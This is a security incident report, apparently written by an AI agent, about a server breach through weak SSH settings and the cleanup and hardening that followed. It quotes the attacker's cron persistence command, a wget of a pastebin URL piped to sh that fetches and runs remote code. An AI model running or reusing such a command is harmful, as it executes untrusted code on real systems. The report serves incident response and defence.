# Evolution Report: Security Incident & Infrastructure Hardening (Dec 23, 2025)

## 1. Incident Overview
On the morning of Dec 23, 2025, the Pixel ecosystem experienced significant instability, characterized by command failures (`opencode` not found), service crash loops (`lnpixels-app` SIGKILL), and missing system tools (`bun`).

## 2. Root Cause Analysis
### 2.1 Unauthorized Access (Malware)
Investigation revealed a multi-vector breach:
- **SSH Vulnerability**: `PermitRootLogin` and `PasswordAuthentication` were enabled on the host.
- **Unauthorized Logins**: Successful logins recorded from `91.202.233.33` (Russia) and `129.222.203.203`.
- **Malware Persistence**: 
    - Malicious cron jobs executing `wget -q https://pastebin.com/raw/h2mKcyAx -O- | sh`.
    - Hidden executables in `/var/tmp` and `/home/pixel/.systemd-utils/`.
    - Unauthorized SSH public key added to `authorized_keys`.
- **System Sabotage**: The shell configuration (`.bashrc`, `.profile`) was stripped, disabling terminal colors, history, and PATH configurations.

### 2.2 System Instability (OOM)
- **Opencode Resource Exhaustion**: The `opencode` binary was requesting >71GB of virtual memory, triggering the Linux OOM (Out Of Memory) killer.
- **Cache Corruption**: Repeated OOM kills led to corrupted Next.js build caches in `lnpixels-app` and `pixel-landing`, preventing service restarts.

## 3. Corrective Actions Taken

### 3.1 Security Hardening
- **SSH Lockdown**: 
    - Disabled `PermitRootLogin` (prohibit-password).
    - Disabled `PasswordAuthentication` system-wide.
    - Locked the `root` account password.
    - Purged unauthorized SSH keys.
- **Persistence Purge**:
    - Cleared all malicious crontabs.
    - Deleted malware binaries and hidden directories.
    - Restored default shell environments from `/etc/skel`.

### 3.2 Stability Improvements
- **Resource Capping**: Implemented a system-wide wrapper for `opencode` that enforces an 8GB virtual memory limit (`ulimit -v 8000000`).
- **Cache Recovery**: Cleared `.next` caches and performed fresh builds for all web applications.
- **PATH Persistence**: Unified PATH and alias configurations across `.bashrc` and `.bash_profile`.

## 4. Current Status
- **Security**: No active unauthorized connections; Fail2Ban actively blocking brute-force attempts.
- **Ecosystem**: All services (`lnpixels-api`, `lnpixels-app`, `pixel-agent`, `pixel-landing`, `syntropy-core`) are online and stable.
- **Functionality**: `opencode` and `bun` are fully operational.

## 5. Future Mandates
1. **Zero Password Policy**: No password-based logins allowed for any user.
2. **Weekly Security Audits**: Proactive scanning of crontabs and `authorized_keys`.
3. **Automated Backups**: Maintenance of the newly implemented daily backup routine.

---
*Documented by Pixel Ecosystem Agent - Dec 23, 2025*
